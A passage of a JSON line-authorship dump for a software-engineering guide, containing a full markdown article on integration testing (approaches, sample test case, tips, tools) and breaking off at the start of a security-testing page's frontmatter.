        "content": "- [Swift Cheat Sheet](https://mhm5000.gitbooks.io/swift-cheat-sheet/content/index.html) (web-friendly)"
      },
      {
        "lineNumber": 382,
        "author": {
          "gitId": "-"
        },
        "content": "- [Swift 3.0 Cheat Sheet and Quick Reference](https://koenig-media.raywenderlich.com/uploads/2014/06/RW-Swift-Cheatsheet-0_7.pdf) (print-friendly)"
      },
      {
        "lineNumber": 383,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 384,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 15,
      "-": 367
    }
  },
  {
    "path": "contents/testing/integration-testing.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Integration Testing"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Integration Testing"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Jacob Li PengCheng](https://github.com/jacoblipech)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is integration testing?](#what-is-integration-testing)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why is integration testing important?](#why-is-integration-testing-important)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How does integration testing work?](#how-does-integration-testing-work)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [1. Prepare the integration test plan](#1-prepare-the-integration-test-plan)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [2. Design the test scenarios, cases and scripts](#2-design-the-test-scenarios-cases-and-scripts)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [3. Execute the test scripts and report defects if any](#3-execute-the-test-scripts-and-report-defects-if-any)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [4. Track defects and re-test application](#4-track-defects-and-re-test-application)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Tips for better integration tests](#tips-for-better-integration-tests)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Tools used for Integration Testing](#tools-used-for-integration-testing)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Amrut Prabhu](https://github.com/amrut-prabhu), [Marvin Chin Kun Song](https://github.com/marvinchin), [Lin Si Jie](https://github.com/sijie123)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Integration Testing?"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Integration testing is a part of software testing where individual parts of your application are combined and tested as a group. This usually happens after the [\u003ctooltip content\u003d\"Testing of individual module units within a system\"\u003eunit testing stage\u003c/tooltip\u003e](https://www.guru99.com/unit-testing-guide.html) and before the [\u003ctooltip content\u003d\"Evaluation of the software against requirements gathered from users and system specifications\"\u003esystem testing stage\u003c/tooltip\u003e](https://www.guru99.com/system-testing.html)."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Integration testing combines individually tested modules as a group and aims to discover faults related to the interactions between these modules."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s look at an example to better understand what these means."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose that you have built an online food ordering system and the architecture diagram of your application is shown as follows:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "![Sample architecture diagram](integration-test/sample-architecture.png \"Sample architecture diagram\")"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Zooming in on the food ordering aspect of this system, a unit test on the `Order Summary` checks for the correctness of the order details recorded and a unit test on the `Order Food` checks that the food ordered is in the correct format."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "After completion of unit testing on individual modules, an **integration test** on `Order Food` and `Order Summary` checks that upon ordering food, the order summary reflects the correct food orders."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "After completion of integration testing, a system test on the entire application could mimic a customer\u0027s point of view and checks that the functionalities such as `Order Food`, `Payment` and `Generate Report` work as intended."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why is Integration Testing Important?"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "In a software application, each software module is usually designed and unit tested by different programmers."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "Since these programmers may work in isolation and have different understandings of the software requirements, integration testing is necessary to ensure that the software modules work in unity and expose any faults in the interaction between different units."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose the `Order Food` module mentioned earlier allows each user to submit up to 10 orders each time. If the `Order Summary` module can only record a maximum of 5 orders each time, when the orders from `Order Food` are passed to the `Order Summary` module, 5 of the orders may not be taken into account. "
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "Hence, there is potential for problems such as such as **data loss**, **inaccurate results** and even **system errors**."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Integration tests find these discrepancies before any serious damage is done."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Although system testing also help to uncover faults between modules, integration testing is still preferable as it is able to **better isolate** the scope of the features during testing, making it **easier** and **faster** to test."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "In fact, many integration problems can be detected and resolved in the early stage of development, which makes debugging easier when problems arise in the future."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "Hence, integration testing can be useful in the development of any non-trivial software product. "
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Concepts shared in this article can be adopted by different software applications."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "On top of that, in the current era of \u003ctooltip content\u003d\"Practice of merging developers\u0027 work continuously into a shared repository\"\u003eContinuous Integration\u003c/tooltip\u003e (CI), integration testing is useful to help with early detecion of defects while maintaining the quality of the product throughout further developments."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "The concept of [Continuous Integration Testing](https://crossbrowsertesting.com/blog/continuous-integration/continuous-integration-testing-delivery/) is also formed to combine integration testing with continuous integration."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://bitwaretechnologies.com/integration-testing-important-software-testing-life-cycle/) showcases more advantages of doing integration testing before system testing."
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://www.guru99.com/integration-testing.html) provides more information on instances where integration testing is important."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How Does Integration Testing Work?"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Using this specific system as an example, below is a list of things you should follow to execute effective integration testing:"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "1. Prepare the integration test plan."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "1. Design the test scenarios, cases and scripts."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "1. Execute the test scripts and report defects if any."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "1. Track defects and re-test application."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### 1. Prepare the Integration Test Plan"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "Before the actual implementation of your integration tests, it is important to decide on the approach used."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "There are a few different approaches of integration testing in which you can adopt depending on the development progress of your application."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Big Bang Approach:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "This approach involves integrating all the modules in your design diagram together and testing everything at once in a complete state. "
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "This is convenient but it is difficult to isolate defects and there is a high chance of missing critical underlying defects."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "Big bang integration testing is usually used for smaller applications with few modules."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "An example of how big bang integration testing can be applied to our given example is shown below:"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "![Big bang integration testing diagram](integration-test/big-bang-integration.png \"Big bang integration testing diagram]\")"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://www.tutorialspoint.com/software_testing_dictionary/big_bang_testing.htm) provides more details on the big bang approach."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Incremental Testing Approach:"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "This approach involves integrating two or more logically related modules. The other related modules are added and tested for proper functioning. This is repeated until all the modules are joined (or _integrated incrementally_) and tested successfully. It is usually preferred for applications with many modules."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "Incremental integration testing is further split into the 3 approaches shown below:"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "| | [Top-down approach](https://www.guru99.com/integration-testing.html#9) | [Bottom-up approach](https://www.guru99.com/integration-testing.html#8) | [Hybrid / sandwich approach](https://www.guru99.com/integration-testing.html#10) |"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "| -- | -- | -- | -- |"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "| **Description**| Based on the dependency order of modules, high level modules are tested first, followed by lower level modules. | The reverse of top-down approach. | A mix of both top-down bottom-up approaches. |"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "| \u003cspan style\u003d\"color:green\"\u003e**Advantages**\u003c/span\u003e| Early discovery of high level architecture / design defects. | Easier to create test cases bottom up. | Beneficial for big project to distribute tasks on testing."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "| | Main control points of the system are tested early. | Critical modules on functionalities are tested first. | Allow top-down and bottom-up approach to run side by side. |"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "| \u003cspan style\u003d\"color:red\"\u003e**Disadvantages**\u003c/span\u003e | Significant low level modules are tested late in the cycle. | There is no testable working system until the higher level modules are build. | It is difficult to test for highly interconnected modules. |"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "| | A [\u003ctooltip content\u003d\"A program that simulates the behaviours of software modules\"\u003estub\u003c/tooltip\u003e](https://stackoverflow.com/questions/463278/what-is-a-stub) is not perfect to simulate data flow as it only contain very basic, hardcoded data of the module. | A [\u003ctooltip content\u003d\"Module with dummy code to temporarily replace a module\"\u003edriver\u003c/tooltip\u003e](https://www.professionalqa.com/test-driver) test is even harder to write than stub. | Higher cost from using both driver and stub. You can better understand the difference [here](https://www.quora.com/What-is-the-difference-between-stubs-and-drivers-in-software-testing)."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://www.softwaretestinghelp.com/incremental-testing/) provides a more detailed guide, with examples, on using specific methods for incremental testing together."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: The [NUS Software Engineering textbook](https://se-education.org/se-book/integration/#integration) also offers some concrete examples of different approaches of integration testing."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### 2. Design the Test Scenarios, Cases and Scripts"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "Before the actual coding is done, a basic test strategy deciding the test cases and test data used should be crafted. This usually involves setting a \u003cspan style\u003d\"color:red\"\u003etest case ID\u003c/span\u003e, \u003cspan style\u003d\"color:red\"\u003eobjective\u003c/span\u003e, \u003cspan style\u003d\"color:red\"\u003edescription\u003c/span\u003e and \u003cspan style\u003d\"color:red\"\u003eexpected result\u003c/span\u003e."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Using the example shown above, below shows a sample integration test used for the `login` and `ordering` modules:"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "~~~"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "Test case ID: 1"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "Objective: Check the link between login and ordering modules"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Description: Enter login credentials and click on login button"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "Expected result: To be directed to order food page based on the login user"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "~~~"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"warning\"\u003eAs integration test cases are \u003ctooltip content\u003d\"It generally takes longer time due to additional overheads such as waiting for dependent modules to respond\"\u003eexpensive operations\u003c/tooltip\u003e compared to unit testing, it should focus mainly on the integration of modules together and not on specific actions within the same module.\u003c/box\u003e"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://www.softwaretestinggenius.com/various-approaches-in-integration-testing/) explains more about the ways to structure incremental testing."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### 3. Execute the Test Scripts and Report Defects if Any"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Depending on the approach you have chosen for your integration plan and the test cases, the way you execute your code for testing will differ."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "- Big bang approach usually requires all the modules to be developed before you can start with the integration testing."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "- Incremental approach is usually conducted simultaneously with the module\u0027s development. Stubs and drivers are used to mimic the modules for writing tests since not all modules are developed at the point of integration testing."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "The [NUS Software Engineering module site](https://nus-cs2103-ay1819s1.github.io/cs2103-website/se-book-adapted/chapters/testing.html#stubs) provides concrete codes for using stubs."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-exclamation-circle: Either way, such test scripts can help you in singling out specific integration errors to be resolved before it gets more serious. Hence, you should ensure that all high prioritized bugs are fixed before moving on. "
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: [This article](https://www.guru99.com/test-environment-software-testing.html) shows more details on how to set up a test environment for better integration testing."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### 4. Track Defects and Re-Test Application"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "In the event of failing your integration test case, it is important to learn how to track down the [\u003ctooltip content\u003d\"Incorrect behavior observed from the system\"\u003edefects\u003c/tooltip\u003e](https://qacomplete.com/resources/articles/what-is-a-software-defect/) occured. "
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "Thereafter, you should make changes to your application to fix them and re-test your application with integration testing to ensure that the defects are no longer there."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": ":fas-info-circle: [This article](https://www.professionalqa.com/defect-tracking-process) covers more details on how to effectively track down defects in a system and fix them."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Tips for Better Integration Tests"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "- **Make sure that each module is unit tested before integration testing**\u003cbr\u003e"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "By ensuring that each unit test is completed properly, integration testing will be smoother as we can focus mainly on the flow of data between modules."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "- **Prioritize the modules to be tested**\u003cbr\u003e"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "Despite the need to cover all areas of integration of the application, it is important to ensure that critical modules needs to be tested first."
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "- **Keep testing suites separate**\u003cbr\u003e"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "Integration tests should be run separately from unit tests. Developers working on backend logic can run unit tests frequently and get immediate result."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "They do not have to meddle with integration testing unnecessarily."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "- **Ensure that all executed test cases are documented**\u003cbr\u003e"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "This helps you to identify errors quickly through an integration test."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "It also helps to standardize the way integration testing is carried out in your application so that everyone can conform to the given standard."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "- **Automate your tests (optional)**\u003cbr\u003e"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "As far as possible, automate all your tests, especially when you use the incremental approach since regression testing is important each time you integrate a new unit, and manual regression testing can be inefficient. "
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "You can find a list of most commonly used [automation tools](https://medium.com/@briananderson2209/best-automation-testing-tools-for-2018-top-10-reviews-8a4a19f664d2) for integration testing. [This article](https://techbeacon.com/devops/6-best-practices-integration-testing-continuous-integration) provides more useful tips for CI projects."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: The article [Dos and donts of integration testing](https://www.fogbugz.com/blog/9-integration-testing-dos-and-donts/) has further advices on specific details to take note when writing your own integration test."
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Tools Used for Integration Testing"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Generally integration test can be implemented based on your existing unit testing tools."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "However, if you do not have an existing testing tool in place, here are some useful tools that you can consider for your integration testing:"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [VectorCast](https://www.vectorcast.com/) is a tool which operates based on executing unit tests first before integration tests as discussed in this article."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "- [Gauge](https://gauge.org/) acts as a plugin which can be incorporated to any language or IDE. "
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "It is an lightweight cross-platform test automation tool which makes testing easier to maintain, more readable and scalable."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "- [Selenium](https://www.seleniumhq.org/) is an open source test automation framework focusing on web applications. "
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "It supports a wide range of programming languages, cross-browser testing with extensive libraries and the ability to create robust test scripts to handle many scenarios. The article [Getting started with Selenium for automated website testing](https://wiki.saucelabs.com/display/DOCS/Getting+Started+with+Selenium+for+Automated+Website+Testing) gives an overall guide to integrating selenium to automate integration testing for your web application."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "- [Google EarlGrey](https://google.github.io/EarlGrey/) is a native iOS automation test framework allowing developers to write and maintain clear concise tests. "
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "It has a powerful built-in synchornization which allows it to reproduce any UI interactivity and test them."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ":fas-info-circle: Although there are many integration testing tools available, more research needs to be conducted to ensure the compatibility of the tools with your application. [This article](https://www.softwaretestinghelp.com/integration-testing-tools/) has more integration testing tools."
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 11,
      "jamessspanggg": 3,
      "iskandarzulkarnaien": 13,
      "-": 170
    }
  },
  {
    "path": "contents/testing/security-testing.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "  title: Introduction to Security Testing"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "madanalogy"
        },
